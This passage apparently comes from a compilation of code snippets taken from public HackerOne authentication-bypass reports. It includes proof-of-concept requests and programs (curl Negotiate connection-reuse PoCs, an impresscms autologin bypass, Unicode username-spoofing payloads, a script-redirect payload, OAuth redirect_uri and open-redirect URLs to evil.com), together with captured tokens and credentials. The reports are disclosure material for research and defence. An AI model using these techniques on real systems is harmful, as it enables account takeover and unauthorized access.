// create db Model that simulates structure required for `express-laravel-passport` to work properly
const Model = sequelize.define('oauth_access_tokens', {
  user_id: Sequelize.INTEGER
}, {
  timestamps: false
});

// create DB
sequelize.sync()
  // put some test data to DB
  .then(() => Model.bulkCreate([{user_id:1},{user_id:2},{user_id:3}]))
  // run the express app with `express-laravel-passport` as middleware
  .then(() => {
    app.get('/', passportMiddleware, (req, res) => {
      const user_id = req.user_id;
      if (user_id) {
        res.send(`logged in as: ${user_id}\n`)
      } else {
        res.send('not logged in\n')
      }
    })

    app.listen(port, () => console.log(`Example app listening on port ${port}!`))
  })
```

## 57. [#1170024](https://hackerone.com/reports/1170024)  -  Attacker can obtain write access to any federated share/public link
*high, $4,000*

```bash
curl -v -X POST http://localhost/index.php/ocm/notifications -d '{"notificationType":"RESHARE_CHANGE_PERMISSION","resourceType":"file","providerId":2,"notification":{"sharedSecret":"nOxdNJkb1xbI1VX","permission":["read","write","share"]}}' -H 'Content-type: application/json'
```

## 58. [#734936](https://hackerone.com/reports/734936)  -  SSO bypass in zendesk using trint organization able to leak internal ticket information
*high*

```
HTTP/1.1 200 OK
Date: Mon, 11 Nov 2019 12:17:06 GMT
Content-Type: application/json
Content-Length: 272
Connection: close
X-Powered-By: Express
Access-Control-Allow-Origin: *
Vary: Accept-Encoding

{"data":{"zendeskToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1NzM0NzQ2MjYsImp0aSI6IjcwOWM2Njg3LWI3OWUtNDI2ZC04MjJhLWVkYTUyYzM3ZDAyYyIsIm5hbWUiOiJzZGFkc2FzZGEgYXNkc2FkYXMiLCJlbWFpbCI6InN1cHBvcnQrMUB0cmludC5jb20ifQ.G8VnRzcF5vkDl4X36_-olJNjtdawMn5G0KaL0FHPdQM"}}
```

## 59. [#776684](https://hackerone.com/reports/776684)  -  [h1-415 2020] My writeup on how to retrieve the special secret document
*critical*

```html
<script>document.location.href='//website'</script>
```

## 60. [#3642555](https://hackerone.com/reports/3642555)  -  CVE-2026-5545: wrong reuse of HTTP Negotiate connection
*medium*

```bash
python3 nego_server.py 8999 &
```

## 61. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```java
if (this.getIntent() != null && this.getIntent().getData() != null) {
            String var2 = this.getIntent().getData().getQueryParameter("start");
            if (var2 != null && var2.equals("PartTwoActivity") && var4.contains("USERNAME")) {
                var2 = var4.getString("USERNAME", "");
                Editor var3 = var4.edit();
                String var5 = var4.getString("TWITTERHANDLE", "");
                var3.putString("PARTONE", "COMPLETE").apply();
                this.logFlagFound(var2, var5);
                this.startActivity(new Intent(this, PartTwoActivity.class));
            }
}
```

## 62. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```java
public void onDataChange(DataSnapshot var1) {
                String var2x = (String)var1.getValue();
                SharedPreferences var3 = PartTwoActivity.this.getSharedPreferences("user_created", 0);
                Editor var6 = var3.edit();
                String var4 = var2;
                StringBuilder var5 = new StringBuilder();
                var5.append("X-");
                var5.append(var2x);
                if (var4.equals(var5.toString())) {
                    var2x = var3.getString("USERNAME", "");
                    String var7 = var3.getString("TWITTERHANDLE", "");
                    PartTwoActivity.this.logFlagFound(var2x, var7);
                    var6.putString("PARTTWO", "COMPLETE").apply();
                    PartTwoActivity.this.correctHeader();
                } else {
                    Toast.makeText(PartTwoActivity.this, "Try again! :D", 0).show();
                }

}
```

## 63. [#1081986](https://hackerone.com/reports/1081986)  -  Potential Authentication Bypass through "autologin" feature
*low*

```bash
$ php auth-bypass.php http://localhost/impresscms/ admin
[-] Starting authentication bypass attack...
[-] 2021-01-20 022141
[-] You can autologin with the following cookies:
[-] Cookie: autologin_uname=admin; autologin_pass=2021-01-20 022141:0
```

## 64. [#3721183](https://hackerone.com/reports/3721183)  -  CVE-2026-8458: wrong reuse for different services
*low*

```bash
curl 8.20.0 (x86_64-pc-linux-gnu) libcurl/8.20.0 OpenSSL/3.6.1 zlib/1.3.1 mit-krb5/1.22.1
Release-Date: 2026-04-29
Protocols: http https ipfs ipns ws wss
Features: alt-svc AsynchDNS Debug GSS-API HSTS HTTPS-proxy IPv6 Kerberos Largefile libz SPNEGO SSL threadsafe TLS-SRP UnixSockets
```

## 65. [#3642555](https://hackerone.com/reports/3642555)  -  CVE-2026-5545: wrong reuse of HTTP Negotiate connection
*medium*

```python
#!/usr/bin/env python3
"""
Test server speaking the curl stub GSS protocol.

Stub protocol (lib/curl_gssapi.c):
- Client sends base64(creds:target:type:padding)
- Server responds with:
  - base64("C") = Qw== for Continue
  - base64("D") = RA== for Done (auth complete)

For KRB5: client sends type=1 (STUB_GSS_KRB5), server replies D -> GSS_S_COMPLETE
This causes curl to set http_negotiate_state = GSS_AUTHSUCC

The server tracks authenticated connections by TCP socket and serves
subsequent requests using the original identity (persistent Negotiate auth,
like Windows IIS with Kerberos).
"""
import http.server
import socketserver
import base64
import json
import sys

conn_auth = {}  # conn_key -> identity
request_log = []


class NegotiateHandler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        pass

    def _key(self):
        return f"{self.client_address[0]}:{self.client_address[1]}"

    def do_GET(self):
        k = self._key()
        auth = self.headers.get("Authorization", "")

# … truncated …
```

## 66. [#3642555](https://hackerone.com/reports/3642555)  -  CVE-2026-5545: wrong reuse of HTTP Negotiate connection
*medium*

```c
/*
 * PoC: NTLM tentative connection match bypasses Negotiate auth state check
 *
 * Demonstrates that in a multi-handle shared connection pool, when:
 *   1. Handle A authenticates via Negotiate (SPNEGO/Kerberos)
 *   2. Handle B requests the same host with CURLAUTH_ANY + different creds
 *
 * The NTLM tentative match in url_match_auth_ntlm() (url.c:1092) sets
 * m->found on the connection with mismatched credentials, returns FALSE,
 * which exits url_match_conn() BEFORE url_match_auth_nego() runs.
 * url_match_result() then attaches the connection based solely on m->found.
 *
 * Result: Handle B's request goes out on Handle A's TCP connection.
 * On a server with persistent Negotiate auth (IIS/Kerberos default),
 * this means Handle B is authenticated as User A.
 *
 * Build:
 *   gcc -o poc poc.c -I../include -L../lib/.libs -lcurl -Wl,-rpath,../lib/.libs
 *
 * Run:
 *   python3 server.py 8999 &
 *   ./poc
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>

#define URL "http://127.0.0.1:8999/api/secret"

/* Capture response body */
struct response {
    char *data;
# … truncated …
```

## 67. [#1580493](https://hackerone.com/reports/1580493)  -  Bypass validation parts in AWS IAM Authenticator for Kubernetes
*high, $2,500*

```go
for key, values := range queryParams {
		if !parameterWhitelist[strings.ToLower(key)] {
			return nil, FormatError{fmt.Sprintf("non-whitelisted query parameter %q", key)}
		}
		if len(values) != 1 {
			return nil, FormatError{"query parameter with multiple values not supported"}
		}
		queryParamsLower.Set(strings.ToLower(key), values[0])
	}
```

## 68. [#3434156](https://hackerone.com/reports/3434156)  -  Username Validation Bypass
*medium*

```php
$malicious_username = "admin" . "\xE2\x80\x8B";  // Hex bytes
// OR
$malicious_username = "admin" . mb_chr(0x200B, 'UTF-8');  // Unicode codepoint
```

## 69. [#3434156](https://hackerone.com/reports/3434156)  -  Username Validation Bypass
*medium*

```php
<?php
$username = "admin" . "\xE2\x80\x8B";  // admin + Zero-Width Space

echo "Username: admin[U+200B]\n";
echo "Hex bytes: " . bin2hex($username) . "\n";
echo "Expected: 61646d696ee2808b\n\n";

// Test against patched pattern
if (preg_match('#[\x00-\x1F\x7F\s]#u', $username)) {
    echo "Result: BLOCKED ✓\n";
} else {
    echo "Result: PASSES - VULNERABLE! ✗\n";
}
?>
```

## 70. [#3434156](https://hackerone.com/reports/3434156)  -  Username Validation Bypass
*medium*

```php
$malicious_username = "admin" . "\xE2\x80\xAE" . "test";  // Hex bytes
// OR
$malicious_username = "admin" . mb_chr(0x202E, 'UTF-8') . "test";  // Unicode
```

## 71. [#3434156](https://hackerone.com/reports/3434156)  -  Username Validation Bypass
*medium*

```php
<?php
$username = "admin" . "\xE2\x80\xAE" . "test";  // admin + RTL Override + test

echo "Username: admin[U+202E]test\n";
echo "Hex bytes: " . bin2hex($username) . "\n";
echo "Expected: 61646d696ee280ae74657374\n";
echo "Visual display: 'tset' + 'admin' (reversed!)\n\n";

// Test against patched pattern
if (preg_match('#[\x00-\x1F\x7F\s]#u', $username)) {
    echo "Result: BLOCKED ✓\n";
} else {
    echo "Result: PASSES - VULNERABLE! ✗\n";
}
?>
```

## 72. [#3434156](https://hackerone.com/reports/3434156)  -  Username Validation Bypass
*medium*

```php
$malicious_username = "\xD0\xB0" . "dmin";  // Hex bytes
// OR
$malicious_username = mb_chr(0x0430, 'UTF-8') . "dmin";  // Unicode
```

## 73. [#1580493](https://hackerone.com/reports/1580493)  -  Bypass validation parts in AWS IAM Authenticator for Kubernetes
*high, $2,500*

```json
{{AccessKeyID}}
```

## 74. [#748214](https://hackerone.com/reports/748214)  -  [express-laravel-passport] Improper Authentication
*high*

```
${user_id}
```

## 75. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```json
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/bounty-pay-code/request-logger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

## 76. [#292783](https://hackerone.com/reports/292783)  -  Oauth flow on the comments widget login can lead to the access code leakage
*low*

```
https://github.com/login?client_id=5f45cc999f7812d0b6d2&return_to=%2Flogin%2Foauth%2Fauthorize%3Fclient_id%3D5f45cc999f7812d0b6d2%26redirect_uri%3Dhttps%253A%252F%252Fedoverflow.com%252F1%26scope%3Dpublic_repo
```

## 77. [#292783](https://hackerone.com/reports/292783)  -  Oauth flow on the comments widget login can lead to the access code leakage
*low*

```
https://github.com/login?client_id=5f45cc999f7812d0b6d2&return_to=%2Flogin%2Foauth%2Fauthorize%3Fclient_id%3D5f45cc999f7812d0b6d2%26redirect_uri%3Dhttps%253A%252F%252Fedoverflow.com%252Fabout%252f%26scope%3Dpublic_repo
```

## 78. [#2536758](https://hackerone.com/reports/2536758)  -  Authentication & Registration Bypass in Newspack Extended Access
*medium*

```
${window.location.protocol}
```

## 79. [#2536758](https://hackerone.com/reports/2536758)  -  Authentication & Registration Bypass in Newspack Extended Access
*medium*

```
${window.location.hostname}
```

## 80. [#1580493](https://hackerone.com/reports/1580493)  -  Bypass validation parts in AWS IAM Authenticator for Kubernetes
*high, $2,500*

```yaml
mapUsers:
  - userARN: arn:aws:iam::000000000000:user/Alice
    username: user:{{AccessKeyID}}
    groups:
    - test
```

## 81. [#1040786](https://hackerone.com/reports/1040786)  -  Exposure of a valid Gitlab-Workhorse JWT leading to various bad things
*high*

```ruby
def self.new_from_headers(headers)
    return unless needed_headers_provided?(headers)

    new(headers['Geo-GL-Id'])
  end

  def user
    @user ||= identify_using_ssh_key(gl_id)
  end
```

## 82. [#1758174](https://hackerone.com/reports/1758174)  -  Unauthorized access to GovSlack
*medium, $1,500*

```
await fetch("https://slack.com/api/signup.createTeam?_x_id=noversion-1667355054.372", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "multipart/form-data; boundary=---------------------------34111059701841183173198228768",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    },
    "referrer": "https://slack.com/get-started",
    "body": "-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"email_misc\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"tz\"\r\n\r\nAmerica/Los_Angeles\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"locale\"\r\n\r\nen-US\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"last_tos_acknowledged\"\r\n\r\ntos_mar2018\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"login\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"in_setup_experiment\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768--\r\n",
    "method": "POST",
    "mode": "cors"
});
# … truncated …
```

## 83. [#3642555](https://hackerone.com/reports/3642555)  -  CVE-2026-5545: wrong reuse of HTTP Negotiate connection
*medium*

```bash
gcc -o poc poc.c -I../include -L../lib/.libs -lcurl \
    $(pkg-config --libs openssl libnghttp2 zlib libbrotlidec libzstd libpsl \
      krb5-gssapi krb5 libidn2) -lldap -llber -Wl,-rpath,../lib/.libs

CURL_STUB_GSS_CREDS="KRB5_userA" ./poc
```

## 84. [#921780](https://hackerone.com/reports/921780)  -  Improper Authentication - any user can login as other user with otp/logout & otp/login
*critical*

```
HTTP/1.1 200 OK
date: Mon, 13 Jul 2020 01:39:18 GMT
content-type: application/json;charset=utf-8
vary: Accept-Encoding
x-cloud-trace-context: 4ea579062bff12ec2ef2162a59116f2e
server: API Gateway
cache-control: no-cache, no-store
x-snapchat-notice: Snapchat Private APIs - Unauthorized use is prohibited.
x-snapchat-request-id: █████
x-snapchat-server-latency: 342
strict-transport-security: max-age=31536000; includeSubDomains
Via: 1.1 google, 1.1 google
Alt-Svc: h3-Q050=":443"; ma=2592000,h3-Q046=":443"; ma=2592000,h3-Q043=":443"; ma=2592000,quic=":443"; ma=2592000; v="46,43"
Connection: close
Content-Length: 137

{"status":"SUCCESS","user_id":"█████████","token":"█████","expiry_hint":████}
```

## 85. [#921780](https://hackerone.com/reports/921780)  -  Improper Authentication - any user can login as other user with otp/logout & otp/login
*critical*

```
HTTP/1.1 200 OK
date: Mon, 13 Jul 2020 01:40:18 GMT
content-type: application/json;charset=utf-8
vary: Accept-Encoding,Accept-Encoding
x-cloud-trace-context: f88a46255f8542b12008295d77cf1b5c
server: API Gateway
cache-control: no-cache, no-store
x-snap-refresh-token: ████
x-snapchat-notice: Snapchat Private APIs - Unauthorized use is prohibited.
x-snap-access-tokens: ███
x-snapchat-request-id: ████████
strict-transport-security: max-age=31536000; includeSubDomains
Via: 1.1 google, 1.1 google
Alt-Svc: h3-Q050=":443"; ma=2592000,h3-Q046=":443"; ma=2592000,h3-Q043=":443"; ma=2592000,quic=":443"; ma=2592000; v="46,43"
Connection: close
Content-Length: 138867

{"updates_response":{"logged":true,"username":"█████","user_id":"█████",...
```

## 86. [#1342088](https://hackerone.com/reports/1342088)  -  Flickr Account Takeover using AWS Cognito API
*critical*

```bash
$ aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=flickr-Benign@lauritz-holtmann.de
{
    "CodeDeliveryDetailsList": [
        {
            "Destination": "f***@l***.de",
            "DeliveryMedium": "EMAIL",
            "AttributeName": "email"
        }
    ]
}
```

## 87. [#824203](https://hackerone.com/reports/824203)  -  Cache Manager ACL Bypass
*critical*

```http
Patch: http://www.squid-cache.org/Versions/v4/changesets/squid-4-e1e861eb9a04137fe81decd1c9370b13c6f18a18.patch

Assigned: CVE-2019-12524
```

## 88. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 13:30:33 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Thu, 01-Jul-2020 13:30:33 GMT; Max-Age=2592000
Location: /
Content-Length: 0
```

## 89. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 14:13:03 GMT
Content-Type: application/json
Connection: close
Content-Length: 177

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=01&year=2020","data":"{\"description\":\"Transactions for 2020-01\",\"transactions\":[]}"}
```

## 90. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 14:31:10 GMT
Content-Type: application/json
Connection: close
Content-Length: 205

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK#\/statements?month=11&year=2019","data":"{\"account_id\":\"F8gHiqSdpK\",\"owner\":\"Mr Brian Oliver\",\"company\":\"BountyPay Demo \"}"}
```

## 91. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 17:01:42 GMT
Content-Type: application/json
Connection: close
Content-Length: 493

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/uploads#\/statements?month=11&year=2019",
"data":"<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"}
```

## 92. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```bash
$ d2j-dex2jar BountyPay.apk   
dex2jar BountyPay.apk -> ./BountyPay-dex2jar.jar
```

## 93. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```bash
$ adb shell am start -a android.intent.action.VIEW -d "one://part?start=PartTwoActivity"
```

## 94. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```bash
$ adb shell am start -a android.intent.action.VIEW -d "two://part?two=light\&switch=on"
```

## 95. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```bash
$ adb shell am start -a android.intent.action.VIEW -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk%3D\&switch=b24%3D\&header=X-Token"
```

## 96. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 20:20:27 GMT
Content-Type: application/json
Connection: close
Content-Length: 81

{"account_id":"F8gHiqSdpK","owner":"Mr Brian Oliver","company":"BountyPay Demo "}
```

## 97. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```
HTTP/1.1 400 Bad Request
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 20:41:43 GMT
Content-Type: application/json
Connection: close
Content-Length: 21

["Missing Parameter"]
```

## 98. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```
HTTP/1.1 201 Created
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 20:53:53 GMT
Content-Type: application/json
Connection: close
Content-Length: 110

{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```

## 99. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 01 Jun 2020 04:14:38 GMT
Content-Type: application/json
Connection: close
Set-Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NVRQRC8rV01aenlqQ2pWU0lGNUlpYkRlOXlZWk1BR0hqTzFPaWQ0bDA0M2xZdXozYkJqRURhdXczckZGTWlCSGtVR3lDU3FycUZGUjY0QXNHbzMybnJQZFZkYUIwc3ZpVWJ4VCtLWmZhYS83Q0IwTlNncy93aDZrbFlPTzE3UT09; expires=Fri, 03-Jul-2020 04:14:38 GMT; Max-Age=2592000; path=/
Content-Length: 19

["Report received"]
```

## 100. [#3721183](https://hackerone.com/reports/3721183)  -  CVE-2026-8458: wrong reuse for different services
*low*

```bash
LD_LIBRARY_PATH=/tmp/curl-8.20.0/lib/.libs \
LD_PRELOAD=/tmp/libpoc_gss_service_reuse.so \
POC_GSS_CREDS=NTLM_Alice \
/tmp/curl-8.20.0/src/curl -sv --noproxy '*' \
  --negotiate --service-name svcA http://127.0.0.1:18080/svcA \
  --next \
  --negotiate --service-name svcB http://127.0.0.1:18080/svcB
```

## 101. [#3721183](https://hackerone.com/reports/3721183)  -  CVE-2026-8458: wrong reuse for different services
*low*

```
* Reusing existing http: connection with host 127.0.0.1
> GET /svcB HTTP/1.1
> Host: 127.0.0.1:18080
> User-Agent: curl/8.20.0
> Accept: */*
...
SVC_B_REUSED_AUTH_FROM_A
```

## 102. [#3721183](https://hackerone.com/reports/3721183)  -  CVE-2026-8458: wrong reuse for different services
*low*

```bash
LD_LIBRARY_PATH=/tmp/curl-8.20.0/lib/.libs \
LD_PRELOAD=/tmp/libpoc_gss_service_reuse.so \
POC_GSS_CREDS=NTLM_Alice \
/tmp/curl-8.20.0/src/curl -sv --noproxy '*' \
  --negotiate --service-name svcB http://127.0.0.1:18080/svcB
```

## 103. [#576504](https://hackerone.com/reports/576504)  -  Authentication Bypass by abusing Insecure crypto tokens in /lib/OA/Dal/PasswordRecovery.php:
*high*

```
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 09 May 2019 21:26:20 GMT
Content-Type: application/x-javascript
Connection: close
Vary: Accept-Encoding
X-Cacheable: NO:Not Cacheable
Age: 0
X-Cache: MISS
X-Frame-Options: SAMEORIGIN
Content-Length: ...
```

## 104. [#3734676](https://hackerone.com/reports/3734676)  -  Taskcluster web-server OAuth2 authorization codes are reusable and the exchange handler checks the wrong expiry column
*medium, $2,000*

```bash
$ source ~/.nvm/nvm.sh && nvm use 24.15.0
$ cd taskcluster && yarn install
$ docker compose up -d postgres
$ docker exec taskcluster-postgres-1 psql -U postgres -c "CREATE DATABASE \"taskcluster-test\";"
$ cd services/web-server
$ TEST_DB_URL=postgresql://postgres@localhost:5432/taskcluster-test NODE_ENV=test \
    yarn mocha --grep "TC-002" test/third_party_test.js
```

## 105. [#1490470](https://hackerone.com/reports/1490470)  -  Admin Authentication Bypass Lead to Admin Account Takeover
*medium*

```
HTTP/2 200 OK
Cache-Control: no-cache,no-cache,no-store
Pragma: no-cache,no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Server: 
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains;preload
X-Frame-Options: DENY
X-Ua-Compatible: IE=Edge
Content-Security-Policy: script-src 'self'; object-src 'self'; frame-ancestors 'none'
Expect-Ct: enforce, max-age=7776000, report-uri='███-Allow-Origin: ██████-Allow-Headers: Accept, Content-Type, Origin
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Date: ████ ██████ GMT
Content-Length: 71

{"status":true,"errorMessage":"Username and Password does not match."}
```

## 106. [#1544236](https://hackerone.com/reports/1544236)  -  returnUrl= allow attacker to redirect users to the another phising website and takeover credientials
*medium*

```
███/WKUbuJKtOIbCH0Npi1DvVp0kXUo7JYrQ2Kep6VUOybmgBo6q9byEMy3Itsa35Ra60cK2eUFK6i78lKdX4/QN4Ln3UPEzfpMTvk8ocH6Ikix0zKolaN/0kaMWB3Ia4GCVOvTPhfZUGkgOY/HMC9ZCrdjXMNP/joOqZ/oqBrFRu4tCE/mX/JW5o3J18Hx9MOuOVCNgs1mD8zKjIz1uSW+oBmu+MfXT&returnUrl=https://evil.com
```

## 107. [#405100](https://hackerone.com/reports/405100)  -  Stealing Users OAUTH Tokens via redirect_uri
*medium*

```
https://accounts.bistudio.com/api/auth?response_type=code&redirect_uri=http%3A%2F%2Fxbox.dayz.comtest.com%2Fapi%2Fauth%2Fcallback&state=OCoU2LvhmzLGAZ03DWem5QNs&client_id=%24edd1bfdc470df4b8d7b81c2683fc6d3
```

## 108. [#3744543](https://hackerone.com/reports/3744543)  -  CVE-2026-8927: env-set cross-proxy Digest auth state leak
*medium*

```
CURLOPT_PROXY proxyA -> CURLOPT_PROXY proxyB
Result: no stale Proxy-Authorization header sent to proxyB
```

## 109. [#3287396](https://hackerone.com/reports/3287396)  -  AWS | Self Registration Internal LibreChat : Access to internal/proprietary LLMs
*low*

```bash
$ dig  +short ██████
███
█████████
```

## 110. [#3721183](https://hackerone.com/reports/3721183)  -  CVE-2026-8458: wrong reuse for different services
*low*

```bash
cd /tmp
curl -fsSLo /tmp/curl-8.20.0.tar.xz https://curl.se/download/curl-8.20.0.tar.xz
tar -xf /tmp/curl-8.20.0.tar.xz
cd /tmp/curl-8.20.0

./configure \
  --prefix=/tmp/curl-8.20.0-install \
  --enable-debug \
  --with-openssl \
  --with-gssapi \
  --disable-ldap \
  --disable-ldaps \
  --without-libidn2 \
  --without-libpsl \
  --without-brotli \
  --without-zstd \
  --without-libssh2 \
  --without-nghttp2 \
  --disable-ftp \
  --disable-file \
  --disable-tftp \
  --disable-rtsp \
  --disable-dict \
  --disable-telnet \
  --disable-pop3 \
  --disable-imap \
  --disable-smb \
  --disable-smtp \
  --disable-gopher \
  --disable-mqtt \
  --disable-manual

make -j2
```
